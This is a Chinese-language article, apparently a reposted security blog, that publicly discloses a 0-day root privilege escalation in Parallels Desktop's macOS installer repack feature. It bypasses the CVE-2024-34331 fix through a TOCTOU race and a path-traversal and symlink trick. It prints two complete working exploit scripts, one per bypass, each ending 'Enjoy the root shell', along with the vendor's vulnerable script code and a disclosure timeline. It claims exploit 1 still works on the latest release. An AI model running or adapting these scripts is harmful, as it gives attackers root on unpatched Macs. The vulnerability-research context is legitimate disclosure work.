#  0day漏洞：Parallels Desktop Repack Root权限提升   
 Ots安全   2025-02-26 11:30  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
今天，我披露了一个可以绕过CVE-2024-34331补丁的0-day 漏洞。我已经确定了两种不同的方法来绕过该修复程序。这两种绕过方法都分别报告给了Zero Day Initiative (ZDI)和受影响的供应商Parallels。不幸的是，他们的回应非常不令人满意。  
  
鉴于供应商已将此漏洞搁置了七个多月（尽管之前已披露），我选择公开披露此零日漏洞。我的目标是提高认识并敦促用户主动降低风险，因为攻击者可能会在野外利用此漏洞。  
  
背景  
  
在阅读了 Mykola 关于旧CVE-2024-34331的博客后，我意识到 Parallels 的补丁确实很容易绕过：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taekMCD6gQsNjjLD6gq1fafzTqCAl8vKtYUROuBicYRyuiaKV0pQQlhOibE1u0gYqgnGlQ4VOdAAH6XyA/640?wx_fmt=png&from=appmsg "")  
  
建议先阅读他的原始博客。  
  
绕过  
  
修补代码用于验证该工具是否createinstallmedia经过 Apple 签名。如果是，则将createinstallmedia以root 权限启动该工具。否则，它将以错误退出。  
  
至少有两种不同的方法可以绕过这里验证：  
1. 通过TOCTOU攻击绕过：通过签名验证之后，在生成工具之前，攻击者有足够的时间createinstallmedia用恶意工具替换该工具！  
  
1. 签名验证所需的字符串“anchor apple”太弱了！攻击者可以找到Apple 签名的可执行二进制文件（例如系统命令ls），然后将恶意 DYLIB 注入Apple 的二进制文件以直接绕过签名验证！我在之前的博客中讨论过这个技巧。  
  
漏洞 1  
  
该函数的漏洞利用脚本do_repack_createinstallmedia如下：  
  
```
#!/bin/sh# Bypass the patch of CVE-2024-34331 via TOCTOUecho"[?] whoami; id"whoamiidecho"[*] Dropping a payload..."cat << EOF > /tmp/payload#!/bin/shtouch /Library/lpe/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal &EOFchmod +x /tmp/payloadecho"[*] Dropping a fake macOS installer..."mkdir -p /tmp/poc.app/Contents/Resourcescp /bin/ls /tmp/poc.app/Contents/Resources/createinstallmediadefaults write /tmp/poc.app/Contents/Info.plist CFBundleDisplayName createinstallmediaecho"[*] Trigger the repack..."open /tmp/poc.app -a /Applications/Parallels\ Desktop.appecho"[*] Waitting for the verification..."dir_pattern="/Users/$USER/Parallels/*iso.tmp.*"# Check if the random directory existswhile [ -z "$(ls -d $dir_pattern 2>/dev/null)" ]; do    :donemv /tmp/payload /tmp/poc.app/Contents/Resources/createinstallmediaecho"[*] All done. Enjoy the root shell :P"
```  
  
  
时间线  
  
Mykola 于 5 月 30 日发布了他的博客。  
  
我于 5 月 31 日立即向 ZDI 报告了此绕过行为。  
  
然而，ZDI 来不及处理这份报告，随后情况发生了变化：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taekMCD6gQsNjjLD6gq1fafzhNQK26ibOOM4ufpuv129LfKU7ibatoIuRpV1HXsrmRibWw1jYq04BoLkg/640?wx_fmt=png&from=appmsg "")  
  
ZDI 告诉我，他们无法在 版本上重现该漏洞19.4.1，但我提交此报告时是最新版本。他们在我报告六周后才19.4.0开始调查此案！  
  
自 19.4.1 版本以来发生了一些变化  
  
通过研究，我发现repack可执行二进制文件中的命令行发生了变化prl_disp_service：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taekMCD6gQsNjjLD6gq1fafzMnP3Y5sViaY6icOXf4c5Udghhib1dyJMgibaEQ8uWF7c7bsSsQVKLMcr7w/640?wx_fmt=png&from=appmsg "")  
  
在版本中19.4.0，命令行是：/bin/bash /Applications/Parallels Desktop.app/Contents/Resources//repack_osx_install_app.sh repack /private/tmp/poc.app /Users/fuzz/Parallels/macOS image file.iso -w  
  
在版本中19.4.1，命令行是：/bin/bash /Applications/Parallels Desktop.app/Contents/Resources//repack_osx_install_app.sh repack /private/tmp/poc.app /Users/fuzz/Parallels/macOS image file.dmg -w -z /Applications/Parallels Desktop.app/Contents/MacOS//7z  
  
从脚本中Parallels Desktop.app/Contents/Resources/repack_osx_install_app.sh：  
  
```
do_repack() {# Parse and check args/optionsif [[ $# -lt 2 ]]; then    echo"Please specify the app bundle and resulting image file path."    return$ERR_INVALID_ARGfilocal source_app="${1%/}"local result_dmg="$2"shift 2local overwrite="n"local p7z_tool=""whilegetopts wz: OPT; do    case"$OPT"in    w) overwrite="y" ;;    z) p7z_tool="$OPTARG" ;;    esacdone...# Do repack (using 7z tool, if specified, or native tools only)if [[ -f "$source_app/Contents/SharedSupport/InstallESD.dmg" || -n "$p7z_tool" ]]; then    do_repack_manual "$source_app""$result_dmg""$p7z_tool"else    do_repack_createinstallmedia "$source_app""$result_dmg"fi}
```  
  
  
我们可以知道它现在使用的是函数do_repack_manual，而不是函数do_repack_createinstallmedia。  
  
新问题  
  
好的，让我们检查一下该功能do_repack_manual：  
  
```
do_repack_manual() {local source_app="$1"local result_dmg="$2"local p7z_tool="$3"# make temp directory for files manupulation  temp_dir="$(mktemp -d -t 'osx_install_diskimage')"local temp_contents_dir="$temp_dir"/contents  mkdir "$temp_contents_dir"local source_app_basename="$(basename "$source_app")"local result_vol_name="$(defaults read "$source_app"/Contents/Info CFBundleDisplayName)"local temp_result_dir=""local kernelcache_name=""local bootefi_name=""if [[ -z "$p7z_tool" ]]; then    ...else    local base_system_dmg=""    local temp_base_system_dmg=""    if [[ -e "$source_app"/Contents/SharedSupport/BaseSystem.dmg ]]; then      base_system_dmg="$source_app"/Contents/SharedSupport/BaseSystem.dmg    elif [[ -e "$source_app"/Contents/SharedSupport/InstallESD.dmg ]]; then...    elif [[ -e "$source_app"/Contents/SharedSupport/SharedSupport.dmg ]]; then...    fi    # Extract (via 7z) boot.efi, prelinkedkernel, ... from BaseSystem.dmg    [ -e "$base_system_dmg" ] && "$p7z_tool" e -aos -o"$temp_contents_dir""$base_system_dmg" \      */System/Library/PrelinkedKernels/prelinkedkernel \      */System/Library/Caches/com.apple.kext.caches/Startup/kernelcache \      */System/Library/CoreServices/bootbase.efi \      */System/Library/CoreServices/boot.efi \      */System/Library/CoreServices/SystemVersion.plist \      */System/Library/CoreServices/PlatformSupport.plist    [ -z "$temp_base_system_dmg" ] || rm -- "$temp_base_system_dmg"fi...if [[ -z "$p7z_tool" ]]; then    ...else    # Make directory for "hybrid CD" creation    temp_result_dir="$temp_dir"/"$result_vol_name"    mkdir "$temp_result_dir"fi# Compose resulting .dmg contents (copy .app bundle, boot and kernel files, ...)  move_file "$temp_contents_dir"/"$bootefi_name""$temp_result_dir"/System/Library/CoreServices/boot.efi  move_file "$temp_contents_dir"/SystemVersion.plist "$temp_result_dir"/System/Library/CoreServices/SystemVersion.plist  move_file "$temp_contents_dir"/PlatformSupport.plist "$temp_result_dir"/System/Library/CoreServices/PlatformSupport.plist...if [[ -e "$temp_contents_dir"/"$kernelcache_name" ]]; then...fiif [[ -e "$source_app"/Contents/SharedSupport/SharedSupport.dmg ]]; then...fi# Copy source .app into image  cp -R "$source_app""$temp_result_dir"if [[ -z "$p7z_tool" ]]; then...else...    rm -rf -- "$temp_result_dir"    "$p7z_tool" e -tapm -so -aos "$temp_hybrid_cd_dmg" *.hfs > "$temp_hfs_partition_dmg" || true...fi...}
```  
  
  
第13行：变量$result_vol_name被攻击者控制，因此$temp_result_dir第50行的路径也受到控制。  
  
在第 70 行（# Copy source .app into image）：源路径$source_app和目标路径$temp_result_dir均受控制。因此，攻击者可以获得一个原语，将任意内容写入任意根拥有的路径。  
  
在下面的漏洞利用中，我覆盖了，它将在第 77 行以root 权限$p7z_tool生成。（这是TCC 应用程序管理允许的。）  
  
由于以下错误处理代码，我的漏洞利用面临一些挑战repack_osx_install_app.sh：  
  
```
trap"cleanup; exit $ERR_UNEXPECTED" ERR
```  
  
- 在第51行，$temp_result_dir不应该存在，否则mkdir将返回错误。  
  
解决方案：使用符号链接重定向根拥有的结果文件夹。  
- 第56行到第58行，操作的源路径必须存在move_file，否则会返回错误：路径不存在。  
  
解决方案：制作一个BaseSystem.dmg可供7z提取的工艺品。  
  
漏洞2  
  
该函数的新利用脚本do_repack_manual如下：  
  
```
#!/bin/shecho"[?] whoami; id"whoamiidecho"[*] Dropping a payload..."cat << EOF > /tmp/payload#!/bin/shtouch /Library/lpe/System/Applications/Utilities/Terminal.app/Contents/MacOS/TerminalEOFchmod +x /tmp/payloadecho"[*] Dropping a fake macOS installer..."mkdir -p /tmp/poc.app/Contents/Resourcesmv /tmp/payload /tmp/poc.app/Contents/Resources/createinstallmediadefaults write /tmp/poc.app/Contents/Info.plist CFBundleDisplayName ../../../../../../tmp/lnk/result# redirect the root-owned folder "result"mkdir /tmp/redirectln -s /tmp/redirect /tmp/lnkecho"[*] Dropping a fake BaseSystem.dmg..."mkdir -p /tmp/tmp/System/Library/CoreServices/touch /tmp/tmp/System/Library/CoreServices/boot.efitouch /tmp/tmp/System/Library/CoreServices/SystemVersion.plisttouch /tmp/tmp/System/Library/CoreServices/PlatformSupport.plist/Applications/Parallels\ Desktop.app/Contents/MacOS/7z a 1.zip /tmp/tmpmkdir -p /tmp/poc.app/Contents/SharedSupport/mv 1.zip /tmp/poc.app/Contents/SharedSupport/BaseSystem.dmgmkdir -p /tmp/dst/result/poc.app/Contents/Resources# in the command:# cp -R "$source_app" "$temp_result_dir"# the 7z command will be replaced by my payloadln -s /Applications/Parallels\ Desktop.app/Contents/MacOS/7z /tmp/dst/result/poc.app/Contents/Resources/createinstallmediaecho"[*] Trigger the repack..."open /tmp/poc.app -a /Applications/Parallels\ Desktop.appecho"[*] Waitting for the temp_result_dir..."while [ ! -d "/tmp/redirect/result" ]; do  :doneln -sfn /tmp/dst /tmp/lnkecho"[*] All done. Enjoy the root shell :P"
```  
  
  
时间线  
  
这次我再也不相信ZDI了。所以我决定直接向供应商报告这个新问题：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taekMCD6gQsNjjLD6gq1fafzCqTwUwbpFyTQ1ZIlWCXHAyBZNxeA2t39P5B3ia7vNlgAUypcK8I6Ezw/640?wx_fmt=png&from=appmsg "")  
<table><caption><section><span leaf=""><br/></span></section></caption><tfoot><tr><td></td></tr></tfoot><colgroup><col/><col/></colgroup></table><table><thead><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;font: inherit;vertical-align: baseline;"><th style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border-width: 1px;border-style: solid;border-color: rgb(222, 222, 222) rgb(222, 222, 222) rgb(201, 201, 201);border-image: initial;font: inherit;vertical-align: baseline;background-color: rgb(240, 240, 240);"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">日期</span></font></font></th><th style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border-width: 1px;border-style: solid;border-color: rgb(222, 222, 222) rgb(222, 222, 222) rgb(201, 201, 201);border-image: initial;font: inherit;vertical-align: baseline;background-color: rgb(240, 240, 240);"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">行动</span></font></font></th></tr></thead><tbody><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;font: inherit;vertical-align: baseline;"><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;" data-mpa-action-id="m7lg9qa8wad"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">2024-07-22</span></font></font></td><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">我：初始报告已发送至 security@parallels.com</span></font></font></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;font: inherit;vertical-align: baseline;background-color: rgb(247, 247, 247);"><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">2024-07-23</span></font></font></td><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">Parallels：将分析该报告</span></font></font></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;font: inherit;vertical-align: baseline;"><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">2024-10-23</span></font></font></td><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">我：要求更新 -&gt;</span></font></font><strong style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;font-style: inherit;font-variant: inherit;font-weight: bold;font-stretch: inherit;font-size: inherit;line-height: inherit;font-family: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">没有回应</span></font></font></strong></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;font: inherit;vertical-align: baseline;background-color: rgb(247, 247, 247);"><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">2025-02-12</span></font></font></td><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">我：要求更新 -&gt;</span></font></font><strong style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;font-style: inherit;font-variant: inherit;font-weight: bold;font-stretch: inherit;font-size: inherit;line-height: inherit;font-family: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">没有回应</span></font></font></strong></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;font: inherit;vertical-align: baseline;"><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">2025-02-19</span></font></font></td><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">我：要求更新 -&gt;</span></font></font><strong style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;font-style: inherit;font-variant: inherit;font-weight: bold;font-stretch: inherit;font-size: inherit;line-height: inherit;font-family: inherit;font-optical-sizing: inherit;font-size-adjust: inherit;font-kerning: inherit;font-feature-settings: inherit;font-variation-settings: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">没有回应</span></font></font></strong></td></tr><tr style="box-sizing: border-box;margin: 0px;padding: 0px;border: 0px;font: inherit;vertical-align: baseline;background-color: rgb(247, 247, 247);"><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">2025-02-20</span></font></font></td><td style="box-sizing: border-box;margin: 0px;padding: 10px 15px;border: 1px solid rgb(232, 232, 232);font: inherit;vertical-align: baseline;"><font style="box-sizing: border-box;vertical-align: inherit;" data-mpa-action-id="m7lg9th91u84"><font style="box-sizing: border-box;vertical-align: inherit;"><span leaf="">我：0day披露</span></font></font></td></tr></tbody></table>  
既然供应商Parallels 装聋作哑，我现在必须披露这个0 day 漏洞。Zero Day Initiative (ZDI)和受影响的供应商Parallels都令人失望，不是吗？  
  
最新版本为 0 天  
  
通过我的测试，我发现 Parallels 已在 19.4.1 版本上恢复了更改。  
  
现在，他们又重新开始使用该功能do_repack_createinstallmedia。  
  
因此我的漏洞 1可以在最新版本上运行20.2.1 (55876)，演示视频：  
  
https://youtu.be/j91H7shqsBE  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
  
